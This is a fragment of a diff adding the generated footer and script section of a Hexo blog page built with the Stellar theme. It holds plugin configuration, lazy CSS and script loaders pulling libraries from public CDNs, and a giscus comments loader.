+<svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="giscus" data-repo="v2ish1yan/giscus" data-repo-id="R_kgDOJ7K8Jg" data-category="Announcements" data-category-id="DIC_kwDOJ7K8Js4CX3Xt" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="zh-CN" data-loading="lazy" crossorigin="anonymous"></div>
+
+    </section>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function loadJS() {
+    const els = document.querySelectorAll("#comments #giscus");
+    if (els.length === 0) return;
+    els.forEach((el, i) => {
+      try {
+        el.innerHTML = '';
+      } catch (error) {
+        console.log(error);
+      }
+      var script = document.createElement('script');
+      script.src = 'https://giscus.app/client.js';
+      script.async = true;
+      for (let key of Object.keys(el.attributes)) {
+        let attr = el.attributes[key];
+        if (['class', 'id'].includes(attr.name) === false) {
+          script.setAttribute(attr.name, attr.value);
+        }
+      }
+      el.appendChild(script);
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    loadJS();
+  });
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
